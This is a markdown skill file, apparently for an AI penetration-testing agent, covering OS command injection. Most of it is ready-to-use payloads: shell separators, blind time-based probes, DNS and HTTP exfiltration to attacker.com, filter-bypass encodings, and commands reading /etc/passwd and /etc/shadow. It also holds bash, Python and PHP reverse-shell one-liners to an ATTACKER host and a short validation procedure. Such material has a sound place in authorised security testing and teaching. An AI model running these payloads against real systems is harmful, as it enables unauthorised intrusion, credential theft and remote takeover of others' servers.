---
name: os-command-injection
description: OS command injection testing - separators, blind detection, out-of-band exfiltration, and filter bypass techniques
---

# OS Command Injection

OS command injection occurs when user-controlled data is passed to a system shell without proper sanitization. It enables full OS-level command execution. Blind injection (where output is not returned) is more common and requires time-based or out-of-band techniques.

## Attack Surface

**Typical Entry Points**
- Filename parameters processed by system commands
- IP/hostname fields passed to `ping`, `nslookup`, `traceroute`
- Image processing, PDF conversion, archive tools
- Email/username fields used in shell scripts
- User-supplied paths in backup, export, or compile operations
- Server-side `exec()`, `system()`, `shell_exec()`, `os.popen()`, `subprocess.run(shell=True)`

**Languages and Sinks**
- PHP: `exec()`, `shell_exec()`, `system()`, `passthru()`, `popen()`, backtick operator
- Python: `os.system()`, `subprocess.run(shell=True)`, `os.popen()`
- Node.js: `child_process.exec()`, `child_process.execSync()`
- Java: `Runtime.exec()`, `ProcessBuilder`
- Ruby: backtick operator, `system()`, `%x{}`

## Command Separators

### Unix/Linux

```bash
;          # Sequential execution
|          # Pipe output
||         # Execute if previous fails
&&         # Execute if previous succeeds
&          # Background execution
%0a        # URL-encoded newline
`cmd`      # Backtick substitution
$(cmd)     # Dollar-paren substitution
```

### Windows

```cmd
&          # Sequential execution
|          # Pipe output
||         # Execute if previous fails
&&         # Execute if previous succeeds
%0a        # Newline
```

## Detection Payloads

### Time-Based (Blind Detection)

```bash
# Linux - confirm with delay
||sleep 5||
;sleep 5;
|sleep 5
`sleep 5`
$(sleep 5)
||ping -c 5 127.0.0.1||
%0asleep%205%0a

# Windows
||timeout /t 5||
& timeout /t 5 &
||ping -n 6 127.0.0.1||
```

### Output-Based

```bash
|whoami
;whoami
||whoami||
&&id&&
`id`
$(id)
%0aid
;cat /etc/passwd
;ls /
;uname -a
```

### Out-of-Band (DNS Exfiltration)

```bash
# DNS callback
||nslookup attacker.com||
||dig attacker.com||

# Data exfiltration via DNS
||nslookup `whoami`.attacker.com||
||nslookup $(whoami).attacker.com||

# HTTP callback
||curl http://attacker.com||
||wget http://attacker.com||
||curl "http://attacker.com/$(whoami)"||

# OAST (Burp Collaborator / interactsh)
||nslookup BURP-COLLAB-URL||
||curl BURP-COLLAB-URL||
```

## Filter Bypass Techniques

### Space Filtering

```bash
# IFS variable
cat${IFS}/etc/passwd
cat${IFS}${PATH:0:1}etc${PATH:0:1}passwd

# Tab substitute
cat%09/etc/passwd
{cat,/etc/passwd}

# Redirect
cat</etc/passwd
```

### Quote Injection

```bash
w'h'o'a'm'i
w"h"o"a"m"i
```

### Case / Wildcard

```bash
/???/??t /???/p?sswd     # Glob wildcards
/bin/c?t /etc/passwd
$(tr "[A-Z]" "[a-z]" <<<"WHOAMI")
```

### Encoding Bypass

```bash
# URL encoding (double-encode if needed)
%77%68%6f%61%6d%69     # whoami URL-encoded
$(printf 'who')'a''mi'

# Base64 decode exec
echo d2hvYW1p | base64 -d | bash
$(base64 -d<<<d2hvYW1p)
```

### Variable Construction

```bash
$'\x77\x68\x6f\x61\x6d\x69'    # \x whoami
a=wh;b=oa;c=mi;$a$b$c           # Variable concatenation
```

## Exploitation Patterns

### Standard Data Exfiltration

```bash
# Read passwd
;cat /etc/passwd
;head -1 /etc/shadow

# Enumerate environment
;env
;printenv

# Network info
;ifconfig
;ip a s
;netstat -antp
```

### Reverse Shell

```bash
;bash -i >& /dev/tcp/ATTACKER/4444 0>&1
;bash -c 'exec bash -i &>/dev/tcp/ATTACKER/4444 <&1'
;python3 -c 'import os,pty,socket;s=socket.socket();s.connect(("ATTACKER",4444));[os.dup2(s.fileno(),f) for f in (0,1,2)];pty.spawn("sh")'
;php -r '$s=fsockopen("ATTACKER",4444);exec("sh <&3 >&3 2>&3");'
```

### Windows Specific

```cmd
& whoami
& ipconfig /all
& net user
& dir C:\
& type C:\Windows\win.ini
& powershell -enc BASE64_ENCODED_COMMAND
```

## Validation Approach

1. Start with time-based probes — never send destructive commands first
2. Confirm with `sleep 5` — observe 5-second delay in proxy response time
3. Escalate to `nslookup $(whoami).collaborator.com` for OOB confirmation
4. Then test output-based `||id||` if output is reflected
5. Proxy evidence: proxy request shows injected payload; response time or OOB callback confirms execution

## Tools

- `commix` — automated command injection detection and exploitation
- Burp Suite Collaborator — OOB DNS/HTTP callback server
- `interactsh` — open-source OOB callback server
- Manual time-based via `send_request` / `repeat_request` with proxy timing analysis
